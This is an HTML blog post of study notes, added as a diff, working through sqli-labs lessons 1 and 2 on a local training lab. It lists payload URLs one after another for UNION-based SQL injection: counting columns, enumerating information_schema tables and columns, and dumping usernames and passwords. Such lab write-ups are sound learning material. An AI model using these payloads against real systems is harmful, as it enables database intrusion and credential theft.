@@ -1,0 +1,374 @@
+
+
+
+
+
+
+
+<!doctype html>
+<html lang="zh-Hans">
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  <meta name="author" content="9527">
+  
+  
+  
+  
+    <meta name="description" content="sqli-labs/less-1①http://127.0.0.1/sqli-labs-master/Less-1/?id=1②http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;③http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39; and &#39;1&#39;=&#39;1
+结果如①
+④...">
+  
+  <title>sqli-labs [ 9527 ]</title>
+  
+  
+    <link rel="shortcut icon" href="/01.ico">
+  
+  
+  <link rel="stylesheet" href="/css/random.css">
+<link rel="stylesheet" href="/css/vegas.min.css">
+<link rel="stylesheet" href="/css/highlight-railscasts.css">
+<link rel="stylesheet" href="/css/jquery.fancybox.css">
+<link rel="stylesheet" href="/css/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/jquery.fancybox-thumbs.css">
+<link rel="stylesheet" href="/css/plyr.css">
+  
+</head>
+
+<body>
+<div class="side-navigate hide-area">
+  
+  
+    <div class="item next">
+      <a href="/2018/07/31/文件包含笔记/">
+        <div class="item-icon"></div>
+      </a>
+      <div class="item-title">
+        文件包含笔记
+      </div>
+    </div>
+  
+</div>
+<div id="outer-container" class="hide-area">
+<div id="container">
+  <div id="menu-outer" class="slide-down">
+    <div id="menu-inner">
+      <div id="brand">
+        
+        <a onClick="openUserCard()">
+          <img id="avatar" src="/background.png"/>
+          <div id="homelink">9527</div>
+        </a>
+      </div>
+      <div id="menu-list">
+        <ul>
+        
+        
+          
+            <li>
+          
+            <a href="/index.html">Home</a>
+            
+          </li>
+        
+          
+            <li>
+          
+            <a href="/archives">Archives</a>
+            
+          </li>
+        
+          
+            <li>
+          
+            <a href="/tags">Tags</a>
+            
+          </li>
+        
+          
+            <li>
+          
+            <a href="/categories">Categories</a>
+            
+          </li>
+        
+          
+            <li>
+          
+            <a href="/about">About</a>
+            
+          </li>
+        
+          
+            <li>
+          
+            <a href="https://github.com/Stella9527">Github</a>
+            
+          </li>
+        
+        </ul>
+      </div>
+      <div id="show-menu">
+        <button>Menu</button>
+      </div>
+    </div>
+  </div>
+
+  <div id="content-outer">
+    <div id="content-inner">
+      
+      
+  <article id="post">
+    <h1>sqli-labs</h1>
+    <p class="page-title-sub">
+      <span id = "post-title-date">Created at 2018-08-03</span>
+      
+        <span id = "post-title-updated">Updated at 2018-08-03</span>
+      
+      
+      
+      <span id = "post-title-tags">
+      Tag
+      
+      
+        
+        
+        <a href="/tags/web/">web</a>
+      
+      </span>
+      
+    </p>
+    
+    <a id="more"></a>
+<h1 id="sqli-labs-less-1"><a href="#sqli-labs-less-1" class="headerlink" title="sqli-labs/less-1"></a>sqli-labs/less-1</h1><p>①<code>http://127.0.0.1/sqli-labs-master/Less-1/?id=1</code><br><img src="/2018/08/03/sqli-labs/01-01.png" alt=""><br>②<code>http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39;</code><br><img src="/2018/08/03/sqli-labs/01-02.png" alt=""><br>③<code>http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39; and &#39;1&#39;=&#39;1</code></p>
+<p>结果如①</p>
+<p>④<code>http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39; and &#39;1&#39;=&#39;2</code><br><img src="/2018/08/03/sqli-labs/01-03.png" alt=""><br><strong>字符型</strong></p>
+<p>⑤<code>http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39; order by 3--+</code></p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#39; order by 4--+</code></p>
+<p>查询的字段为三列<br><img src="/2018/08/03/sqli-labs/01-04.png" alt=""><br>⑥<code>http://127.0.0.1/sqli-labs-master/Less-1/?id=&#39; union select 1,2,3--+</code><br><img src="/2018/08/03/sqli-labs/01-05.png" alt=""><br>只有第2、3列的结果显示</p>
+<p>⑦猜数据库名，用户<br><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=&#39; union select 1,concat_ws(&#39;;&#39;,database(),user()),3--+</code><br><img src="/2018/08/03/sqli-labs/01-06.png" alt=""><br>⑧猜表名：</p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;security&#39;--+</code><br><img src="/2018/08/03/sqli-labs/01-07.png" alt=""><br>发现只能返回查询到的一条记录，用limit</p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;security&#39; limit 1,2--+</code><br><img src="/2018/08/03/sqli-labs/01-08.png" alt=""><br><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;security&#39; limit 2,2--+</code><br><img src="/2018/08/03/sqli-labs/01-09.png" alt=""><br><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;security&#39; limit 3,2--+</code><br><img src="/2018/08/03/sqli-labs/01-10.png" alt=""><br><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;security&#39; limit 4,2--+</code></p>
+<p>结果为空，因此有emails、referers、uagents和users表</p>
+<p>⑨猜列名：</p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=&#39; union select 1,column_name,3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1--+</code><br><img src="/2018/08/03/sqli-labs/01-11.png" alt=""><br><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=&#39; union select 1,column_name,3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 1,1--+</code><br><img src="/2018/08/03/sqli-labs/01-12.png" alt=""><br><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=&#39; union select 1,column_name,3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 2,1--+</code><br><img src="/2018/08/03/sqli-labs/01-13.png" alt=""><br><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=&#39; union select 1,column_name,3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 3,1--+</code></p>
+<p>结果为空，因此users表中有id、username、password三个列</p>
+<p>⑩获得id、username、password</p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=&#39; union select 1,concat_ws(&#39;;&#39;,id,username,password),3 from security.users where 1=1  limit 0,1--+</code><br><img src="/2018/08/03/sqli-labs/01-14.png" alt=""><br><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=&#39; union select 1,concat_ws(&#39;;&#39;,id,username,password),3 from security.users where 1=1  limit 1,1--+</code></p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=&#39; union select 1,concat_ws(&#39;;&#39;,id,username,password),3 from security.users where 1=1  limit 2,1--+</code></p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=&#39; union select 1,concat_ws(&#39;;&#39;,id,username,password),3 from security.users users where 1=1  limit 3,1--+</code></p>
+<p>依次limit加一，直到查询到的结果为空</p>
+<h1 id="sqli-labs-less-2"><a href="#sqli-labs-less-2" class="headerlink" title="sqli-labs/less-2"></a>sqli-labs/less-2</h1><p>①<code>http://127.0.0.1/sqli-labs-master/Less-2/?id=1</code>（可以查询）</p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=1&#39;</code> （查询报错，可以知道查询结果只会显示一行）</p>
+<p>②<code>http://127.0.0.1/sqli-labs-master/Less-2/?id=1&#39; and &#39;1&#39;=&#39;1</code> （查询报错）</p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=1 and 1=1</code> （可以查询，有结果）</p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=1 and 1=2</code> （可以查询，无结果）</p>
+<p><strong>数字型</strong></p>
+<p>③<code>http://127.0.0.1/sqli-labs-master/Less-2/?id=1 order by 3</code> （可以查询）</p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=1 order by 4</code> （Unknown column ‘4’ in ‘order clause’，说明只查询三列）</p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=0 union select 1,2,3</code> （查询结果只显示第2、3行）</p>
+<p>④<code>http://127.0.0.1/sqli-labs-master/Less-2/?id=0 union select 1,2,concat_ws(&#39; ; &#39;,database(),user(),version())</code><br><img src="/2018/08/03/sqli-labs/02-01.png" alt=""><br>⑤<code>http://127.0.0.1/sqli-labs-master/Less-2/?id=0 union select 1,2,table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1--+</code> （查询到emails表）</p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=0 union select 1,2,table_name from information_schema.tables where table_schema=&#39;security&#39; limit 1,1--+</code> （查询到referers表）</p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=0 union select 1,2,table_name from information_schema.tables where table_schema=&#39;security&#39; limit 2,1--+</code> （查询到uagents表）</p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=0 union select 1,2,table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1--+</code> （查询到users表）</p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=0 union select 1,2,table_name from information_schema.tables where table_schema=&#39;security&#39; limit 4,1--+</code> （查询不到结果）</p>
+<p>⑥<code>http://127.0.0.1/sqli-labs-master/Less-2/?id=0 union select 1,2,column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1--+</code> （查询到id列）</p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=0 union select 1,2,column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 1,1--+</code> （查询到username列）</p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=0 union select 1,2,column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 2,1--+</code> （查询到password列）</p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=0 union select 1,2,column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 3,1--+</code> （查询不到该结果）</p>
+<p>⑦<code>http://127.0.0.1/sqli-labs-master/Less-2/?id=0 union select 1,2,concat_ws(&#39; : &#39;,id,username,password) from security.users where 1=1 limit 0,1--+</code> </p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=0 union select 1,2,concat_ws(&#39; : &#39;,id,username,password) from security.users where 1=1 limit 1,1--+</code></p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=0 union select 1,2,concat_ws(&#39; : &#39;,id,username,password) from security.users where 1=1 limit 2,1--+</code></p>
+<p>依次limit加一，直到查询到的结果为空。</p>
+<p>&lt;————-2018-08-03 22:16:32————-&gt;</p>
+<p>独自学习效率好低哇(´｀;)</p>
+
+  </article>
+  <div class="random-toc-area">
+  <button class="btn-hide-toc btn-hide-toc-show" style="display: none" onclick="TOCToggle()">Show TOC</button>
+  <button class="btn-hide-toc btn-hide-toc-hide" onclick="TOCToggle()">Hide TOC</button>
+  <div class="random-toc">
+    <h2>Table of Content</h2>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sqli-labs-less-1"><span class="toc-text">sqli-labs/less-1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqli-labs-less-2"><span class="toc-text">sqli-labs/less-2</span></a></li></ol>
+  </div>
+</div>
+
+  
+<nav id="pagination">
+  
+
+  
+
+  
+    <a href="/2018/07/31/文件包含笔记/" class="next">Next post 文件包含笔记 &rarr;</a>
+  
+</nav>
+
+  <!-- JiaThis Button BEGIN -->
+
+<!-- JiaThis Button END -->
+
+
+      
+      
+    </div>
+  </div>
+
+  <div id="bottom-outer">
+    <div id="bottom-inner">
+      Site by 9527 using
+      <a href="http://hexo.io">Hexo</a> & <a href="https://github.com/stiekel/hexo-theme-random">Random</a>
+      <br>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+
+<div id="user-card">
+  <div class="center-field">
+    <img class="avatar" src="/background.png">
+    <p id="description"></p>
+    <ul class="social-icon">
+  
+  
+    <li>
+      <a href="https://github.com/Stella9527">
+        
+          <i class="icon iconfont github">&#xe606;</i>
+        
+      </a>
+    </li>
+  
+    <li>
+      <a href="http://weibo.com">
+        
+          <i class="icon iconfont weibo">&#xe602;</i>
+        
+      </a>
+    </li>
+  
+    <li>
+      <a href="http://www.douban.com">
+        
+          <i class="icon iconfont douban">&#xe60f;</i>
+        
+      </a>
+    </li>
+  
+</ul>
+  </div>
+</div>
+
+
+<div id="btn-view">Hide</div>
+
+<script>
+// is trigger analytics / tongji script
+var isIgnoreHost = false;
+
+if(window && window.location && window.location.host) {
+  isIgnoreHost = ["localhost","127.0.0.1"].some(function(address){
+    return 0 === window.location.host.indexOf(address);
+  });
+}
+
+var isTriggerAnalytics = !( true && isIgnoreHost );
+
+</script>
+
+
+
+
+  
+  
+    <script src="/js/jquery-2.2.3.min.js"></script>
+  
+    <script src="/js/vegas.min.js"></script>
+  
+    <script src="/js/random.js"></script>
+  
+    <script src="/js/highlight.pack.js"></script>
+  
+    <script src="/js/jquery.mousewheel.pack.js"></script>
+  
+    <script src="/js/jquery.fancybox.pack.js"></script>
+  
+    <script src="/js/jquery.fancybox-thumbs.js"></script>
+  
+    <script src="/js/plyr.js"></script>
+  
+
+<script>
+
+  // fancybox
+  var backgroundImages = [];
+  
+  $('#post').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox') || $(this).parent().hasClass('fancybox-thumb')) return;
+      var alt = this.alt || this.title;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'post' + i);
+    });
+  });
+  $(".fancybox").fancybox();
+
+var vegasConfig = {"preload­Image":true,"transition":["slideLeft2","slideRight2","flash2"],"timer":true,"delay":5000,"shuffle":true,"count":28};
+var unsplashConfig = {"gravity":"north"};
+// is show background images
+var turnoffBackgroundImage = false;
+
+
+
+  turnoffBackgroundImage = true;
+
+
+var backgroundColor = "E6E6FA";
+
+$(".fancybox-thumb").fancybox({
+  prevEffect: 'none',
+  nextEffect: 'none',
+  helpers: {
+    title: {
+      type: 'outside'
+    },
+    thumbs: {
+      width: 50,
+      height: 50
+    }
+  }
+});
+
+// show video with plyr
+$(".video-container iframe").each(function(i){
+  var url = $(this).attr('src');
+  var id = url.split('/').pop();
+  var plyrContainer = document.createElement('div');
+  plyrContainer.className = 'plyr';
+  var plyrElement = document.createElement('div');
+  plyrElement.dataset.videoId = id;
+  switch(true) {
+    case url.search('youtube.com') >= 0:
+      plyrElement.dataset.type = 'youtube';
+      break;
+    case url.search('vimeo.com') >= 0:
+      plyrElement.dataset.type = 'vimeo';
+      break;
+    default:
+      return;
+  };
+  plyrContainer.appendChild(plyrElement);
+  $(this).parent().html(plyrContainer);
+});
+plyr.setup('.plyr', {iconUrl: '/css/sprite.svg'});
+</script>
+</body>
+</html>
+
